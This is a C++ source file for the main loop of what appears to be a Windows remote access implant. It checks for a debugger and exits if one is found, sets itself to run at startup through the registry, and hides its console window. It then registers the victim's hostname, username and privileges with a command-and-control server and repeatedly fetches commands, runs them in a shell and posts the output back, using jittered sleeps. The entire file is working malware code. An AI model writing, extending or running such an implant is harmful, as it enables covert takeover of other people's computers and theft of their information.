#include <iostream>
#include <string>
#include <windows.h>
#include <random>
#include <format>
#include "shell.h"
#include "network_operations.h"
#include "agent.h"
#include "is_debugger_present.h"
#include "persistance.h"
#include "xor_data.h"

int getRandom(int min, int max) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(min, max);
    return dis(gen);
}

std::vector<std::string> split_string(const std::string &s, const std::string &delimiter) {
    size_t position_start{0};
    size_t position_end{};
    size_t delimiter_length{delimiter.length()};
    std::string token;
    std::vector<std::string> res;

    while ((position_end = s.find(delimiter, position_start)) != std::string::npos) {
        token = s.substr(position_start, position_end - position_start);
        position_start = position_end + delimiter_length;
        res.push_back(token);
    }
    //last element in the list also needs to be pushed back, it doesn't meet the above condition,
    //because there are no more delimiters
    res.push_back(s.substr(position_start));
    return res;
}


int main() {

    if(DebuggerPresence()){
        exit(1);
    }

    if(!AddToStartupRegistry("asd")){
        exit(2);
    }

    //Hiding console from user
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    //Initializing agent
    agent fern;
    //register string, send to tell us that the agent is alive and working
    std::string reg{std::format("{},,{},,{}", fern.getHostname(), fern.getUsername(), fern.getPrivilege())};

    std::string ip{fern.getIP()};
    unsigned int port{fern.getPort()};

    //Register agent on the server
    std::string implant_id{post(ip, port, REGISTER, xorStrings(reg, XORKEY))};
    size_t endpos = implant_id.find_last_not_of("\r\n");

// If the string is not just newlines/carriage returns
    if (std::string::npos != endpos) {
        implant_id = implant_id.substr(0, endpos + 1);
    }
    std::cout << implant_id << "\n";
    //vector to hold tasks to execute
    std::vector<std::string> tasks;
    //if (implant_id.empty()) {
    //    std::cout << "[-]No connection to C2 server. Existing!\n";
    //    exit(1);
    //}
    while (true) {
        try {
            int jitter = getRandom(250, 2500);

            std::string implant_task_request = TASKS + std::string("?implant_id=") + implant_id;
            std::string response{get(ip, port, implant_task_request)};
            response = response.substr(1, response.size() - 2);

            //Parsing tasks
            if (!response.empty()) {
                tasks = split_string(response, ",,");

                // Ensure tasks vector has an even number of elements
                if (tasks.size() % 2 != 0) {
                    for (auto &task: tasks) {
                        std::cout << task << "\n";
                    }
                    Sleep(fern.getSleep() + jitter);
                    continue;
                } else {
                    for (size_t i = 0; i < tasks.size(); i += 2) {
                        std::string task_id = tasks[i];
                        std::string command = tasks[i + 1];

                        // Execute the command and get the result
                        std::string result = shell(command);

                        // Fallback for empty result
                        if (result.empty()) result = "1";

                        std::string postresult = task_id + ",," + result;

                        // Post the result
                        post(fern.getIP(), fern.getPort(), RESULTS, postresult);
                        Sleep(500);
                    }
                }
            }
            tasks.clear(); //free memory
            Sleep(fern.getSleep() + jitter);
        } catch (const std::exception &e) {
            std::cerr << "Exception caught: " << e.what() << '\n';
            Sleep(500);
            continue;
        }
    }
}

